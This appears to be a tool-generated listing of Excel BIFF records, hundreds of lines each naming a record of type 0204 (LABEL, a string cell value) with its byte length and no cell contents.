' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     19 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     22 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     10 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     18 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     15 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     11 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     13 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     16 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
' 0204     14 LABEL : Cell Value, String Constant
' 0204     17 LABEL : Cell Value, String Constant
' 0204     12 LABEL : Cell Value, String Constant
